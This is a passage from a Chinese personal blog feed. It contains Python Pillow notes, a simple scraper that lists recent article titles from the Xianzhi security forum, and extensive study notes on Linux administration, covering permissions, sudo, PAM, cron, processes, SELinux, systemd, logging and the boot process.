punctuation">)</span><span class="token punctuation">)</span>打印结果<span class="token punctuation">:</span>     <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span></code></pre><p>Image 对象的 <code>crop()</code>方法接受一个矩形元组, 返回一个Image 对象,表示裁剪后的图像.</p><p><code>save()</code> 方法将裁剪后的图像 存入新文件中</p><p><code>copy()</code> 方法返回一个新的 Image 对象, 和原来的对象具有相同的图像.</p><p><code>resize()</code> 方法在Image 对象上调用.</p><p><code>rotate()</code> 方法选择图像,得到一个新的 Image 对象.</p><p><code>getpixel()</code> 和 <code>putpixel()</code> 方法可以得到单个像素</p><p>不想学后面的内容了,感觉用处不到,还不如花时间学 Python web.</p><p>我好菜啊!还这么废物/!/!!?!?!!!?!!?? dddd</p>]]></content>
      
      
      <categories>
          
          <category> 语言学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python 爬取先知论坛最近更新的文章</title>
      <link href="/posts/20200208/"/>
      <url>/posts/20200208/</url>
      
        <content type="html"><![CDATA[<p>用Python 爬取先知论坛最近更新的文章</p><p>直接上代码了,不多解释,大家都懂的,不过我这个Python小白还是花了好久才调出来了.</p><p>居然不知道可以在一个for循环遍历的时候,可以使用多个变量进行</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#! Python 3.7</span><span class="token comment" spellcheck="true"># author: IFONLY</span><span class="token comment" spellcheck="true"># 爬取先知最新10篇文章</span><span class="token comment" spellcheck="true">#import pyperclip, 因为暂时还不知道怎么解决在遍历时候复制被覆盖的问题,用列表存起来但是数据格式又不正确.</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> bs4<span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">webpy</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    resSoup <span class="token operator">=</span> bs4<span class="token punctuation">.</span>BeautifulSoup<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">,</span> <span class="token string">'html.parser'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 获取超链接</span>    data <span class="token operator">=</span> res<span class="token punctuation">.</span>text    link_list <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">"(/t/\d+)"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 如果要显示作者和日期的话,但是输出格式很丑</span>    <span class="token comment" spellcheck="true"># user_list = re.findall(r"(/u/\d+)", data)</span>    <span class="token comment" spellcheck="true"># 同时需要在遍历时加上第三个变量~</span>    <span class="token keyword">for</span> i<span class="token punctuation">,</span> link <span class="token keyword">in</span> zip<span class="token punctuation">(</span>range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>link_list<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        URL <span class="token operator">=</span> <span class="token string">"https://xz.aliyun.com"</span> <span class="token operator">+</span> link        titleSelect <span class="token operator">=</span> resSoup<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'.topic-title'</span><span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token comment" spellcheck="true">#userSelect = resSoup.select('.topic-info')[i]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>titleSelect<span class="token punctuation">.</span>text <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> URL<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">' '</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">'https://xz.aliyun.com/'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'先知论坛最近更新文章: '</span><span class="token punctuation">)</span>webpy<span class="token punctuation">(</span>url<span class="token punctuation">)</span></code></pre><p>程序运行的结果</p><hr><p>先知论坛最近更新文章: </p><p>​    对MYSQL注入相关内容及部分Trick的归类小结 <a href="https://xz.aliyun.com/t/7169" target="_blank" rel="noopener">https://xz.aliyun.com/t/7169</a><br>​    那些shellcode免杀总结 <a href="https://xz.aliyun.com/t/7170" target="_blank" rel="noopener">https://xz.aliyun.com/t/7170</a><br>​    Ripstech Java Security 2019 Calendar复现系列(二) <a href="https://xz.aliyun.com/t/7162" target="_blank" rel="noopener">https://xz.aliyun.com/t/7162</a><br>​    从一道CTF题初探NTRU格密码 <a href="https://xz.aliyun.com/t/7163" target="_blank" rel="noopener">https://xz.aliyun.com/t/7163</a><br>​    打造一个通用的信息推送框架 <a href="https://xz.aliyun.com/t/7165" target="_blank" rel="noopener">https://xz.aliyun.com/t/7165</a><br>​    如何利用AgentSmith-HIDS检测反弹shell <a href="https://xz.aliyun.com/t/7158" target="_blank" rel="noopener">https://xz.aliyun.com/t/7158</a><br>​    ysoserial URLDNS, CommonsCollections1-7 分析+复现 <a href="https://xz.aliyun.com/t/7157" target="_blank" rel="noopener">https://xz.aliyun.com/t/7157</a><br>​    智能合约审计系列————3、变量覆盖&amp;不一致性检查 <a href="https://xz.aliyun.com/t/7152" target="_blank" rel="noopener">https://xz.aliyun.com/t/7152</a><br>​    Webshell免杀研究 <a href="https://xz.aliyun.com/t/7151" target="_blank" rel="noopener">https://xz.aliyun.com/t/7151</a><br>​    Hitcon Traning Lab10做题笔记 —— UAF漏洞分析 <a href="https://xz.aliyun.com/t/7146" target="_blank" rel="noopener">https://xz.aliyun.com/t/7146</a> </p>]]></content>
      
      
      <categories>
          
          <category> 语言学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 操作系统学习笔记(下)</title>
      <link href="/posts/20200204/"/>
      <url>/posts/20200204/</url>
      
        <content type="html"><![CDATA[<p><strong>使用者识别码: UID (User ID)与 GID (Group ID)</strong></p><p>ID 与 账号的对应在<code>/etc/passwd</code> 当中</p><p><strong>/etc/passwd 文件结构</strong>, 每一行都代表一个账号,有几行就代表有几个账号在你的系统 .我的腾讯云中有21个账号,但是其中有很多是所谓的<strong>系统账号</strong>,就想 bin,nobody等.这些账号不能随便kill掉</p><p>有效群组与初始群组, groups, newgrp</p><p><img src="https://i.loli.net/2020/02/01/lUpj4FATx3ZwsR8.png" alt></p><p>查看所支持的群组使用<code>groups</code>命令.使用<code>newgrp</code>进行有效群组的切换</p><p>新增与移除使用者 <code>useradd</code> ,相关配置文件 <code>passwd, usermod, userdel</code> </p><blockquote><p>Linux 核心支持的账号可以高达232个.系统给予一个帐号 UID 时，他是 （1）先参考 UID_MIN 设置值取得最小数 值； 2）由 /etc/passwd 搜寻最大的 UID 数值， 将 （1） 与 （2） 相比，找出最大的那个再加一就是新帐号的 UID 了</p></blockquote><p><strong>使用者功能</strong></p><p><code>id</code> 查询某人或自己的相关UID/GID</p><p><code>finger</code> 有指纹的意思,他将使用者的相关属性列出来</p><p><code>chfn</code> change finger <code>chsh</code> change shell</p><p><strong>新增与移除群组</strong></p><p><code>groupadd</code> <code>groupmod</code> <code>groupdel</code> <code>gpasswd</code></p><hr><p><strong>windows</strong>下的身份验证系统,称为 <strong>Active Directory(AD)</strong> </p><p><strong>Linux 下 会使用到LDAP,NIS等服务器提供的身份验证</strong></p><blockquote><p><strong>主机的细部权限规划 :  ACL 的使用</strong></p></blockquote><ul><li>什么是ACL 与如何支持启动 ACL</li></ul><blockquote><p>ACL 是 Access Control List 的缩写，主要的目的是在提供传统的 owner,group,others 的 read,write,execute 权限之外的细部权限设置。ACL 可以针对单一使用者，单一文件或目录来进行 r,w,x 的权限规范，对于需要特殊权限的使用状况非常有帮助。</p></blockquote><ul><li>ACL 主要针对的方面的控制权限</li></ul><blockquote><p>使用者 （user）：可以针对使用者来设置权限； </p><p>群组 （group）：针对群组为对象来设置其权限； </p><p>默认属性 （mask）：还可以针对在该目录下在创建新文件/目录时，规范新数据的默认权限； </p></blockquote><ul><li>如何启动 ACL</li></ul><blockquote><p>原本 ACL 是 unix-like 操作系统的额外支持项目，但因为近年以来 Linux 系统对权限 细部设置的热切需求， 因此目前 ACL 几乎已经默认加入在所有常见的 Linux 文件系统的挂载 参数中 （ext2/ext3/ext4/xfs等等</p></blockquote><p>可以使用<code>dmesg</code> 这个命令来检查一下挂载</p><blockquote><p><strong>ACL 的设置技巧: getfacl, setfacl</strong></p></blockquote><p><code>getfacl</code> 取得某个文件/目录的ACL设置项目</p><p><code>setfacl</code> 设置某个目录/文件的ACL规范</p><p>使用默认权限设置目录未来文件的 ACL 权限继承“ d:[u|g]:[user|group]:权限 ” </p><p>特定的单一群组的权限设置：“ g:群组名:权限 ” </p><p>针对有效权限设置：“ m:权限 ” </p><hr><blockquote><p><strong>使用者身份切换</strong></p></blockquote><p>ssh是拒绝root登录的.为了系统安全,可以使用较低权限启动系统服务.</p><p><code>su</code> ,是最简单的身份切换指令,可以进行任何身份的切换</p><p><code>su [-lm] [-c指令] [username]</code> </p><ul><li>- ：单纯使用 - 如“ su - ”代表使用 login-shell 的变量文件读取方式来登陆系统</li><li>若使用者名称没有加上去，则代表切换为 root 的身份。 </li><li>-l ：与 - 类似，但后面需要加欲切换的使用者帐号！也是 login-shell 的方式</li><li>-m ：-m 与 -p 是一样的，表示“使用目前的环境设置，而不读取新使用者的配置文件” </li><li>-c ：仅进行一次指令，所以 -c 后面可以加上指令</li></ul><p><code>su</code>的用法总结</p><ul><li>若要完整的切换到新使用者的环境，必须要使用“ su - username ”或“ su -l username ”,才会连同PATH/USER/MAIL 等变量都转成新使用者的环境； </li><li>如果仅想要执行一次 root 的指令，可以利用“ su - -c “指令串” ”的方式来处理； </li><li>使用 root 切换成为任何使用者时，并不需要输入新使用者的密码；</li></ul><p><code>sudo</code> 因为su需要root的密码.,而sudo只需要自己的密码就行了,甚至不需要密码.sudo 可以以其他用户的身份来执行指令,通常是root.但是必须规范在<code>/etc/sudoers</code>内的用户才能执行sudo这个指令</p><p>我们可以使用<code>visudo</code> 来进行修改<code>/etc/sudoers</code> </p><p><code>ALL</code> 是特殊的关键字, 代表任何身份,主机,指令的意思</p><p>使用<code>sudo su -</code> 搭配使用,用户输入自己的密码后就变成了root的身份,并且root的密码不会外流,管理也比较方便</p><hr><blockquote><p>使用者的特殊 <strong>shell</strong> 与 <strong>PAM</strong> 模块</p></blockquote><p>系统账号的shell就是<code>/sbin/nologin</code> ,重点是系统账号不需要登录,所以给他的是这个无法登录的合法shell.</p><p>所谓的”无法登录”,即使用者无法使用bash或者shell来登录系统而已,并不是说这个账号不能使用其他的系统资源</p><p><strong>PAM(Pluggable Authentication Modules,嵌入式模块)</strong></p><p>PAM 可以说是一套应用程序接口 （Application Programming Interface, API），他提供了一连串的验证机制，只要使用者将验证阶段的需求告知 PAM 后， PAM 就能够回报使用者验证的结果 （成功或失败）。由于 PAM 仅是一套验证的机制，又可以提供给其他程序所调用引 用，因此不论你使用什么程序，都可以使用 PAM 来进行验证，如此一来，就能够让帐号密码或者是其他方式的验证具有一致的结果</p><p><img src="https://t1.picb.cc/uploads/2020/02/01/kWuqsy.png" alt></p><p>PAM 用来进行验证的数据称为模块(<strong>Modules</strong>),每个PAM模块的功能都不太相同</p><blockquote><p><strong>PAM 模块设置语法</strong></p></blockquote><p><img src="https://t1.picb.cc/uploads/2020/02/01/kWuQgN.png" alt></p><p><code>/var/log/secure</code> 或者 <code>/var/log/messages</code> 如果发生任何无法登录或者是产生一些无法预期的错误时,PAM模块都会讲数据记载到<code>/var/log/secure</code>中</p><p>查询使用者 <code>w</code> <code>who</code> <code>last</code> <code>lastlog</code></p><p>使用者对谈 <code>write</code> <code>mesg</code> <code>wall</code> </p><p><img src="https://i.loli.net/2020/02/01/qd7sAhG6juyHKL1.png" alt></p><h1 id="0x14-磁盘配额-Quota-与进阶文件系统管理"><a href="#0x14-磁盘配额-Quota-与进阶文件系统管理" class="headerlink" title="0x14    磁盘配额(Quota) 与进阶文件系统管理"></a>0x14    磁盘配额(Quota) 与进阶文件系统管理</h1><p><strong>学习目的: 了解</strong></p><p>quota 比较常使用的几个情况是： </p><ul><li>针对 WWW server ，例如：每个人的网页空间的容量限制！ </li><li>针对 mail server，例如：每个人的邮件空间限制。 </li><li>针对 file server，例如：每个人最大的可用网络硬盘空间 （教学环境中最常见</li></ul><p>软件自盘阵列(<strong>Software RAID</strong>)</p><p>磁盘阵列全名是“ Redundant Arrays of Inexpensive Disks, RAID ”,意思是：容错式廉价磁盘阵列.RAID通过一个技术,将多个较小的磁盘整合成为一个较大的磁盘设备.</p><p><strong>什么是 LVM,  PV, PE, VG LV的意义</strong></p><p>LVM 的全名是 Logical Volume Manager，中文可以翻译作逻辑卷轴管理员</p><p>Physical Volume, PV, 实体卷轴</p><p>Volume Group, VG, 卷轴群组</p><p>Physical Extent, PE, 实体范围区块 </p><p>Logical Volume, LV, 逻辑卷轴 </p><p><img src="https://t1.picb.cc/uploads/2020/02/01/kWuUdd.png" alt></p><h1 id="0x15-例行工作调度-crontab"><a href="#0x15-例行工作调度-crontab" class="headerlink" title="0x15    例行工作调度(crontab)"></a>0x15    例行工作调度(crontab)</h1><p>Linux 工作调度的种类 最小的时间单位是 <strong>分钟</strong></p><p><code>at</code>   </p><blockquote><p><code>at</code>是个可以处理<strong>仅执行一次就结束</strong>调度的指令,不过要执行<code>at</code>时,必须要有<code>atd</code>这个服务,在一些distribution中,atd可能默认没有开启.</p></blockquote><p><code>crontab</code></p><blockquote><p><code>crontab</code> 这个指令所设置的工作将会<strong>循环的一直进行</strong>下去.,处理使用指令执行之外,还可以通过编辑<code>/etc/crontab</code> 来支持,让crontab生效的服务是<code>crond</code> 服务</p></blockquote><pre><code>systemctl restart atd #重启 atd 服务systemctl enable atd # 让这个服务开机自启systemctl status atd # 查询 atd 目前的状态</code></pre><p><code>at</code>的运行方式</p><p>使用 at 这个指令来产生所要运行的工作，并将这个工作以文本文件的方式写入 /var/spool/at/ 目录内，该工作便能等待 atd 这个服务的取用与执行了</p><p>利用<code>/etc/at.allow</code> 和<code>/etc/at.deny</code> 这两个文件来进行<code>at</code>的使用权限. 如果不存在这两个文件,那么只有 root 可以使用 at这个指令</p><p>如果下达了<code>at</code>后,发现指令输入错误.可以利用<code>atq</code> 与 <code>atrm</code> 来将他移除. atq用于查询,atrm用于移除</p><p><code>batch</code> 在CPU 负载小于0.8的时候才进行下达的工作任务 </p><p><strong>工作负载的意思是： CPU 在单一时间点所负责的工作数量</strong>不是使用率</p><p><code>crontab</code> 的语法</p><ul><li>-u ：只有 root 才能进行这个任务，亦即帮其他使用者创建/移除 crontab 工作调度</li><li>-e ：编辑 crontab 的工作内容 </li><li>-l ：查阅 crontab 的工作内容 </li><li>-r ：移除所有的 crontab 的工作内容，若仅要移除一项，请用 -e 去编辑</li></ul><p>系统的配置文件<code>/etc/crontab</code> 和<code>/etc/cron.d/*</code></p><p>在 Linux 下面的 crontab 会自动的帮我们每分钟重新读取一次 /etc/crontab 的例行工作事项，但是某些原因或者是其他的 Unix 系统中，由于 crontab 是读到内存当中的，所以在你修改完 /etc/crontab 之后，可能并不会马上执行， 这个时候请重新启动 crond 这个服务</p><p><img src="https://i.loli.net/2020/02/02/nmEGfhA4kwbZvSt.png" alt></p><p>检测木马,很多的木马都是以命令的方式注入的,可以检查<code>var/log/cron</code>的内容</p><p><code>anacron</code> 是用来处理非24小时启动的Linux系统的crontab的执行.anacron 每个小时被 crond 执行一次然后 anacron 再去检测相关的调度任务有没有被执行，如果有超过期限的工作在， 就执行该调度任务，执行完毕或无须执行任何调度 时,anacron 就停止了</p><p><img src="https://t1.picb.cc/uploads/2020/02/02/kWCFag.png" alt="本章重点"></p><h1 id="0x16-程序管理与-SELinux-初探"><a href="#0x16-程序管理与-SELinux-初探" class="headerlink" title="0x16    程序管理与 SELinux 初探"></a>0x16    程序管理与 SELinux 初探</h1><p><strong>一个程序被载入到内存当中运行，那么在内存内的那个数据就被称为程序（process</strong></p><p>在Linux 系统当中：“触发任何一个事件时，系统都会将他定义成为一个程序，并且给予这个程序一个 ID ，称为 PID，同时依据启发这个程序的使用者与相关属性关系，给予这个 PID 一组有效的权限设置</p><p><code>fork and exec</code> 程序调用的流程</p><p>程序都会借由父程序以复制 （fork)的方式产生一个一模一样的子程序， 然后被复制出来的子程序再以 exec 的方式来执行实际要进行的程序，最终就成为一个子程序的存在</p><p><img src="https://i.loli.net/2020/02/02/SnC4uNW7Gyt2F1w.png" alt></p><blockquote><p>系统或网络服务: 常驻内存的程序</p></blockquote><p>常驻在内存当中的程序通常都是负责一些系统所提供的功能以服务使用者各项任务，因此这些常驻程序就会被我们称为：服务 （<strong>daemon</strong>）.<strong>一般 daemon 类型的程序都会加上 d在文件名后面</strong></p><p>bash 环境下的工作管理(<strong>job control</strong>)</p><p>直接将指令丢到背景中”执行”的 <code>&amp;</code>,不能被 Ctrl+c 中断</p><p>观察目前的背景工作状态 <code>jobs</code> </p><p>将背景工作拿到前景来处理<code>fg</code></p><p>让工作在背景下的状态变成运行中<code>bg</code></p><p>管理背景当中的工作<code>kill</code></p><p>-l ：这个是 L 的小写，列出目前 kill 能够使用的讯号 （signal） 有哪些？ signal ：代表给予后面接的那个工作什么样的指示啰！用 man 7 signal 可知： </p><ul><li>​    -1 ：重新读取一次参数的配置文件 （类似 reload）； </li><li>​    -2 ：代表与由键盘输入 [ctrl]-c 同样的动作； </li><li>​    -9 ：立刻强制删除一个工作； </li><li>​    -15：以正常的程序方式终止一项工作。与 -9 是不一样的</li></ul><p>kill 后面默认接的数字是 PID, 如果要管理 bash的工作控制,就得要加上%数字</p><p><code>nohup</code>指令可以让工作在离线或者登出系统后继续进行</p><p>静态程序观察<code>ps</code> 动态 <code>top</code></p><p><code>ps</code></p><ul><li>-A ：所有的 process 均显示出来，与 -e 具有同样的效用； </li><li>-a ：不与 terminal 有关的所有 process ； </li><li>-u ：有效使用者 （effective user） 相关的 process ； </li><li>x ：通常与 a 这个参数一起使用，可列出较完整信息。 </li><li>输出格式规划： </li><li>l ：较长、较详细的将该 PID 的的信息列出； </li><li>j ：工作的格式 （jobs format） </li><li>-f ：做一个更为完整的输出。 </li></ul><p><code>top</code></p><p>-d ：后面可以接秒数，就是整个程序画面更新的秒数。默认是 5 秒； </p><p>-b ：以批次的方式执行 top ，还有更多的参数可以使用喔！ </p><p>通常会搭配数据流重导向来将批次的结果输出成为文件。 </p><p>-n ：与 -b 搭配，意义是，需要进行几次 top 的输出结果。 </p><p>-p ：指定某些个 PID 来进行观察监测而已。 </p><p>在 top 执行过程当中可以使用的按键指令： </p><p>? ：显示在 top 当中可以输入的按键指令； </p><p>P ：以 CPU 的使用资源排序显示； </p><p>M ：以 Memory 的使用资源排序显示； </p><p>N ：以 PID 来排序喔！ </p><p>T ：由该 Process 使用的 CPU 时间累积 （TIME+） 排序。 </p><p>k ：给予某个 PID 一个讯号 （signal） </p><p>r ：给予某个 PID 重新制订一个 nice 值。 </p><p>q ：离开 top 软件的按键。 </p><p>观察系统所有程序 <code>ps aux</code></p><p>查找程序之间的相关性 <code>pstree</code></p><p><img src="https://i.loli.net/2020/02/02/MWNX1ISROihtLeZ.png" alt></p><p><code>killall -signal 指令名称</code></p><ul><li>-i ：interactive 的意思，互动式的，若需要删除时，会出现提示字符给使用者； </li><li>-e ：exact 的意思，表示“后面接的 command name 要一致”，但整个完整的指令 </li><li>不能超过 15 个字符。 </li><li>-I ：指令名称（可能含参数）忽略大小写。 </li></ul><p>程序的优先执行序(Priority) 与 CPU 调度</p><p><img src="https://i.loli.net/2020/02/02/6j7PbBOrAJNCpxn.png" alt></p><p>Liunx 给予程序一个所谓的”优先执行序”(priority,PRI),值越低表示越优先的意思,这个<strong>PRI的值是由核心动态调整的.</strong>如果想要调整程序的优先执行序时,可以通过Nice的值.</p><p><code>PRI(new) = PRI(old) + nice</code></p><p>nice 的值可调整的范围为<code>-20~19</code> ,root 可以随意调整自己或者他人程序的Nice值.一般使用者只能调整自己的Nice值,且范围为<code>0~19</code>,并且<strong>只能越调越高</strong></p><p><code>renice</code> 已存在程序的 nice 重新调整</p><hr><p>系统资源的观察</p><p><code>free</code> 观察内存使用情况</p><p>Linux 系统为了加速系统性能,所以会将最常使用到的或者最近使用到的文件数据高速缓存(<strong>cache</strong>)下来,下次系统使用该文件时,直接从内存中搜寻取出,而不需要重新读取硬盘</p><p><code>uname</code> 查询系统与核心相关信息</p><ul><li>-a ：所有系统相关的信息，包括下面的数据都会被列出来； </li><li>-s ：系统核心名称 </li><li>-r ：核心的版本 </li><li>-m ：本系统的硬件名称，例如 i686 或 x86_64 等； </li><li>-p ：CPU 的类型，与 -m 类似，只是显示的是 CPU 的类型！ </li><li>-i ：硬件的平台 （ix86） </li></ul><p><code>uptime</code> 观察系统启动时间与工作负载</p><p><code>netstat</code> 追踪网络或插槽档</p><ul><li>-a ：将目前系统上所有的连线、监听、Socket 数据都列出来 </li><li>-t ：列出 tcp 网络封包的数据 </li><li>-u ：列出 udp 网络封包的数据 </li><li>-n ：不以程序的服务名称，以埠号 （port number） 来显示； </li><li>-l ：列出目前正在网络监听 （listen） 的服务； </li><li>-p ：列出该网络服务的程序 PID</li></ul><p><code>socket file</code> 可以沟通两个程序之间的信息</p><p><code>dmesg</code> 分析核心产生的信息</p><p><code>vmstat</code> 侦测系统资源变化</p><p>-a ：使用 inactive/active（活跃与否） 取代 buffer/cache 的内存输出信息； </p><p>-f ：开机到目前为止，系统复制 （fork） 的程序数； </p><p>-s ：将一些事件 （开机至目前为止） 导致的内存变化情况列表说明； </p><p>-S ：后面可以接单位，让显示的数据有单位。例如 K/M 取代 Bytes 的容量； </p><p>-d ：列出磁盘的读写总量统计表 </p><p>-p ：后面列出分区，可显示该分区的读写总量统计表 </p><p><code>/proc/*</code>  代表的意义</p><p><img src="https://i.loli.net/2020/02/02/58eqaS6xMrkZJPD.png" alt></p><p>查询已经打开文件或已执行程序打开的文件</p><p><code>fuser</code> 借助文件或文件系统找出正在使用该文件的程序</p><p>-u ：除了程序的 PID 之外，同时列出该程序的拥有者； </p><p>-m ：后面接的那个文件名会主动的上提到该文件系统的最顶层，对 umount 不成功很有效！ </p><p>-v ：可以列出每个文件与程序还有指令的完整相关性！ </p><p>-k ：找出使用该文件/目录的 PID ，并试图以 SIGKILL 这个讯号给予该 PID； </p><p>-i ：必须与 -k 配合，在删除 PID 之前会先询问使用者意愿！ </p><p>-signal：例如 -1 -15 等等，若不加的话，默认是 SIGKILL （-9）</p><p><code>lsof</code> 列出被程序所打开的文件文件名</p><p><code>pidof</code> 找出某支正在执行的程序 PID </p><hr><p>SELinux(Security Enhanced Linux ),安全强化的Linux</p><p>传统的文件权限与账户关系: 自主式存取控制,DAC</p><p>当某个程序想要对文件进行存取时， 系统就会根据该程序的拥有者/群组，并比对文件的权限，若通过权限检查，就可以存取该文件了。这种存取文件系统的方式被称为“自主式存取控制 （<strong>Discretionary Access Control</strong>, DAC）</p><p>以政策规则订定特定程序读取特定文件：委任式存取控制, MAC . 针对特定的程序与特定的文件资源来进行权限的控管</p><p><img src="https://i.loli.net/2020/02/02/UghcdJ2IkvVRYW7.png" alt></p><p>SELinux 有 <code>enforcing</code> <code>permissive</code> <code>disabled</code> 三种模式表示强制,宽容,和关闭.</p><p>使用<code>sestatus</code> 指令来观察 SELinux的政策</p><p><img src="https://i.loli.net/2020/02/02/unEvq1AfMj79W43.png" alt="本章重点"></p><h1 id="0x17-认识系统服务-daemons"><a href="#0x17-认识系统服务-daemons" class="headerlink" title="0x17    认识系统服务( daemons )"></a>0x17    认识系统服务( daemons )</h1><p><code>systemd</code>常驻内存</p><p>如果某个服务启动是管理员自己手动执行启动，而不是使用 systemctl 去启动的 （例如你自己手动输入 crond 以启动 crond 服务），那么 systemd 将无法侦测到该服务，而无 法进一步管理</p><p>基本上， systemd 将过去所谓的 daemon 执行脚本通通称为一个服务单位 （unit），而每种服务单位依据功能来区分时，就分类为不同的类型 （type）。 基本的类型有包括系统服务、数据监听与交换的插槽档服务 （socket）、储存系统状态的快照类型、提供不同类似执行等级分类的操作环境 （target） 等等</p><p>这些功能的配置文件都在这些目录当中</p><ul><li>/usr/lib/systemd/system/：每个服务最主要的启动脚本设置，有点类似以前的 /etc/init.d </li><li>下面的文件； </li><li>/run/systemd/system/：系统执行过程中所产生的服务脚本，这些脚本的优先序要比 </li><li>/usr/lib/systemd/system/ 高！ </li><li>/etc/systemd/system/：管理员依据主机系统的需求所创建的执行脚本，其实这个目录有 </li><li>点像以前 /etc/rc.d/rc5.d/Sxx 之类的功能！执行优先序又比 /run/systemd/system/ 高</li></ul><p>到底系统开机会不会执行某些服务其实是看 <code>/etc/systemd/system/</code>下面的设置，所 以该目录下面就是一大堆链接文件</p><p><code>systemctl</code> 指令</p><ul><li>start ：立刻启动后面接的 unit </li><li>stop ：立刻关闭后面接的 unit </li><li>restart ：立刻关闭后启动后面接的 unit，亦即执行 stop 再 start 的意思 </li><li>reload ：不关闭后面接的 unit 的情况下，重新载入配置文件，让设置生效 </li><li>enable ：设置下次开机时，后面接的 unit 会被启动 </li><li>disable ：设置下次开机时，后面接的 unit 不会被启动 </li><li>status ：目前后面接的这个 unit 的状态，会列出有没有正在执行、开机默认执行否、登录等信息等！ </li><li>is-active ：目前有没有正在运行中 </li><li>is-enable ：开机时有没有默认要启用这个 unit</li></ul><p><code>mask</code> 强迫服务注销<code>systemctl mask + 服务名称</code></p><p><code>systemctl list-units</code> 依据unit 列出目前有启动的 unit 加上 <code>--all</code> 会列出没启动的</p><p><code>systemctl list-sockets</code> 列出socket file</p><p><code>/etc/services</code> 中的配置可以将服务于端口号对应在一起</p><p><code>netstat -tlunp</code>  观察网络端口</p><p><img src="https://i.loli.net/2020/02/02/HCqSvFzxja7l13u.png" alt="本章重点"></p><h1 id="0x18-认识与分析登录文件"><a href="#0x18-认识与分析登录文件" class="headerlink" title="0x18    认识与分析登录文件"></a>0x18    认识与分析登录文件</h1><p>什么是登录文件?</p><p>记录系统在什么时候由哪个程序做了什么样的行为时，发生了何种的事件等</p><p>Linux 常见的登录文件文件名</p><ul><li>/var/log/boot.log</li></ul><p>开机的时候系统核心会去侦测与启动硬件，接下来开始各种核心支持 的功能启动等。这些流程都会记录在 /var/log/boot.log 里面 .不过这个文件只会存在这次开机启动的信息，前次开机的信息并不会被保留</p><ul><li>/var/log/cron</li></ul><p>用于查看 crontab调度的问题</p><ul><li>/var/log/dmesg</li></ul><p>记录系统开机的时候核心侦探过程所产生的各项信息</p><ul><li>/var/log/lastlog</li></ul><p>记录系统最近一次登录系统的相关信息</p><ul><li>/var/log/maillog</li></ul><p>记录邮件的往来信息</p><ul><li>/var/log/messages</li></ul><p>记录系统发生的错误信息或者重要信息</p><ul><li>/var/log/secure</li></ul><p>基本上,涉及到需要输入密码的软件,在登录时,都会记录在这个文件中</p><ul><li>/var/log/wtmp,/var/log/faillog</li></ul><p>这两个文件可以记录正确登录系统者的账号信息wtmp与错误登录时所用的账号信息faillog</p><ul><li>/var/log/httpd , /var/log/samba/</li></ul><p><code>rsyslog.service</code> 的配置文件 <code>/etc/rsyslog.conf</code></p><p>+a 的属性让该文件无法被删除与修改</p><p>Linux 主机可以启动一个端口来监听登录服务,这个默认的端口就是 UDP 或 TCP 的 514端口</p><p>systemd-journald 用来管理与查询这次开机后的登录信息，而 rsyslogd 可以用来记录以前及现在的所以数据到磁盘文件中</p><p>使用<code>journalctl</code> 观察登录信息</p><p>使用<code>logger</code> 指令来将数据存储到登录文件中</p><p><img src="https://i.loli.net/2020/02/03/BARCPbemzUDZc2s.png" alt="本章重点"></p><h1 id="0x19-开机流程-模块管理与-Loader"><a href="#0x19-开机流程-模块管理与-Loader" class="headerlink" title="0x19    开机流程,模块管理与 Loader"></a>0x19    开机流程,模块管理与 Loader</h1><ul><li>BIOS：不论传统 BIOS 还是 UEFI BIOS 都会被简称BIOS； </li><li>MBR：虽然分区表有传统 MBR 以及新式 GPT，不过 GPT 也有保留一块相容 MBR 的区块，因此，下面的说明在安装 boot loader 的部份， 鸟哥还是简称为 MBR 喔！总之， MBR 就代表该磁盘的最前面可安装 boot loader 的那个区块就对了(<strong>master boot record,主要开机记录区</strong>)</li><li>BIOS, 开机自我测试与 MBR/GPT </li></ul><p><img src="https://i.loli.net/2020/02/03/yL4dqKjFcxilfRN.png" alt></p><p>虚拟文件系统(Initial RAM Disk 或 Initial RAM Filesystem)一般使用的文件名为<code>/boot/initrd</code> 或 <code>/boot/initramfs</code></p><p><code>systemd</code> 的处理流程</p><p>当我们取得了 /etc/systemd/system/default.target 这一个默认操作界面的设置之后，接下来系统帮我们做了什么呢？ 首先，它会链接到 /usr/lib/systemd/system/ 这个目录下 去取得 multi-user.target 或 graphical.target 这两个其中的一</p><p>使用<code>systemctl list-dependencies graphicat.target</code> 指令查看服务启动流程</p><p>使用 <code>systemctl list-dependencies sysinit.target</code> 查询初始化系统服务, 这些系统的服务有</p><ul><li>特殊文件系统设备的挂载 包括<code>/dev-hugepages.mount dev-mqueue.mount</code>等挂载服务,主要在挂载跟巨量内存分页使用与信息处理的功能</li><li>特殊文件系统的启用,包括磁盘阵列,网络磁盘(iscsi),LVM 文件系统,文件系统对照服务(multipath)等</li><li>开机过程的信息传递与动画执行,使用plymouthd 服务搭配 